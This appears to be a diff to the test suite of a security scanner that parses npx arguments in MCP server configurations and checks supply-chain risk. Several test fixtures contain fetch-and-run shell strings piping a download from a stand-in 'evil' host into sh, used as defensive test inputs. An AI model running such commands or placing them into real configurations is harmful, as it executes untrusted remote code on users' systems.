@@ -323,6 +323,18 @@ describe('Registry Scanner', () => {
   });
 });
 
+describe('npx -c command strings', () => {
+  it('are never sent to the registry or graded as a package', async () => {
+    mockFetch.mockReset();
+    const server = { name: 't', toolName: 't', configPath: 'p', command: 'npx', args: ['-c', 'curl http://evil.sh|sh'] };
+    const { scanSupplyChain } = await import('../../src/scanners/supply-chain-scanner.js');
+    const { scanPackageDeep } = await import('../../src/scanners/package-scanner.js');
+    const found = [...await scanRegistry(server, false), ...(await scanSupplyChain(server, false)).findings, ...await scanPackageDeep(server, false)];
+    expect(mockFetch).not.toHaveBeenCalled();
+    expect(found).toEqual([]);
+  });
+});
+
 describe('npxPackageArg', () => {
   it.each([
     // npm global flags may come before the subcommand
@@ -334,14 +346,14 @@ describe('npxPackageArg', () => {
       '--otp', '--tag', '--node-options', '--script-shell', '--proxy', '--https-proxy', '--cafile', '--include', '--shell',
       '-C', '--globalconfig', '--omit', '--fetch-timeout', '--fetch-retries', '--@acme:registry']
       .map(o => ['npx', [o, 'v', 'evil'], 'evil'] as const),
-    // -c runs a command string, graded as before
-    ['npx', ['-c', 'curl evil.sh|sh'], 'curl evil.sh|sh'],
-    ['npx', ['--call', 'evil-cmd'], 'evil-cmd'],
+    // -c runs a command string: the AST scanner grades it, it is never a package
+    ['npx', ['-c', 'curl evil.sh|sh'], undefined],
+    ['npx', ['--call', 'evil-cmd'], undefined],
+    ['npx', ['--call=curl evil|sh'], undefined],
+    ['npx', ['-c=curl evil|sh'], undefined],
     ['npx', ['-c', 'echo hi', '-p', 'evil-pkg'], 'evil-pkg'],
-    // an allowlisted --package must not vouch for the -c command
-    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], 'curl evil|sh'],
-    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], 'curl evil|sh'],
-    ['npx', ['-c=curl evil|sh'], 'curl evil|sh'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '-c', 'curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
+    ['npx', ['--package=@modelcontextprotocol/server-filesystem', '--call=curl evil|sh'], '@modelcontextprotocol/server-filesystem'],
     ['npx', ['--package=@modelcontextprotocol/server-filesystem', 'mcp-server-filesystem'], '@modelcontextprotocol/server-filesystem'],
     // negatives: exec is only a subcommand under npm, and only once
     ['npx', ['-y', 'exec'], 'exec'],
